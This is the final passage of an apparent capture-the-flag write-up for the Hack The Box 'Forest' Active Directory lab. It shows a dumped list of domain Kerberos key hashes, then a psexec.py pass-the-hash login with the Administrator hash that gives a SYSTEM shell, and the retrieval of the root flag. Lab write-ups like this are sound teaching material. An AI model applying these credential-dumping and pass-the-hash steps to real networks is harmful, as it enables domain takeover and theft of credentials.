htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
H4ck:aes256-cts-hmac-sha1-96:a85017037178b40b944c7a65d2ab5f2612946b5f06a3d7c1d36b3738503943a6
H4ck:aes128-cts-hmac-sha1-96:89cc1f93c9607e793d962e0b3a57d66a
H4ck:des-cbc-md5:cd52cececd6140a4
FOREST$:aes256-cts-hmac-sha1-96:05539363024c0f3fcbe6039f28e255dff27283e717a9b7b1ddeee656ba5ba863
FOREST$:aes128-cts-hmac-sha1-96:3057981896b933d2ad7169ac3ec4abc6
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

<br />

At this point, we can use `psexec.py` to log in NT AUTHORITY\SYSTEM account via `PassTheHash` technique with the Adminstrator's hash:

<br />

```bash
❯ psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6" Administrator@10.10.10.161
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file sOYoHUvX.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service cEFA on 10.10.10.161.....
[*] Starting service cEFA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

<br />

And retrieve `root.txt` flag:

<br />

```bash
C:\Users\Administrator\Desktop> type root.txt
53e69828d30c4f322b77663385xxxxxx
```

<br />

One more Windows machine pwned!

I hope this writeup helped you understand new concepts around Active Directory exploitation.

Keep hacking!❤️❤️

<br />
